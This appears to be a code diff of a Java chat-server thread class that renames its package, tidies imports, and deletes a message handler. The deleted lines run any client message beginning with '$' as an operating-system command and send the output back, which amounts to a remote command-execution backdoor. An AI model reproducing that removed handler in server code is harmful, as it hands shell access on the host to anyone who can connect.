@@ -1,12 +1,14 @@
-package com.virtualpuffer.onlineChat.chat;
+package com.virtualpuffer.onlineChat.SSL;
 
 import com.virtualpuffer.netdisk.service.impl.BaseServiceImpl;
 
-import java.io.*;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintStream;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
-import java.util.LinkedList;
 
 /**
  * 该类为多线程类，用于服务端
@@ -86,14 +88,6 @@ public class ServerThread extends BaseServiceImpl implements Runnable{
                     out.println(CONNECTTEST_RESPONSE);
                 }else if(CONNECTTEST_RESPONSE.equals(str)){
                     connectTag = 0;
-                }else if(str.startsWith("$")){
-                    try{
-                        InputStream inputStream = Runtime.getRuntime().exec(str.substring(1)).getInputStream();
-                        //
-                        copy(inputStream,out);
-                    }catch (Exception e){
-                        out.println(e.getMessage());
-                    }
                 }
             }
         } catch (IOException ioException) {
